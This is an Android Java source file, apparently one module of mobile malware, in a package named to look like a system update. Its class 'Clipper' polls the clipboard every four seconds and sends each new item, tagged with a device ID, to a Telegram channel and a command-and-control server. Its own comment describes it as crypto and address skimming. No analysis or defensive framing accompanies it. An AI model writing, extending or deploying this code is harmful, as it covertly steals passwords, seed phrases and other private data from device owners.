package com.system.update;

import android.content.ClipboardManager;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;

/** Poll clipboard — crypto/address skimming style. */
public final class Clipper {
    private static final Handler H = new Handler(Looper.getMainLooper());
    private static String last = "";
    private static boolean running;

    private Clipper() {}

    public static void start(Context ctx) {
        if (running) return;
        running = true;
        Context app = ctx.getApplicationContext();
        H.post(new Runnable() {
            @Override public void run() {
                try {
                    ClipboardManager cm = (ClipboardManager) app.getSystemService(Context.CLIPBOARD_SERVICE);
                    if (cm != null && cm.hasPrimaryClip() && cm.getPrimaryClip() != null
                            && cm.getPrimaryClip().getItemCount() > 0) {
                        CharSequence t = cm.getPrimaryClip().getItemAt(0).coerceToText(app);
                        if (t != null) {
                            String s = t.toString();
                            if (!s.isEmpty() && !s.equals(last) && s.length() < 4000) {
                                last = s;
                                Telegram.send("📋 CLIP\nid=" + C2.getDeviceId() + "\n" + s);
                                C2.send("clipboard", s);
                            }
                        }
                    }
                } catch (Throwable ignored) {}
                if (running) H.postDelayed(this, 4000);
            }
        });
    }

    public static void stop() { running = false; }
}
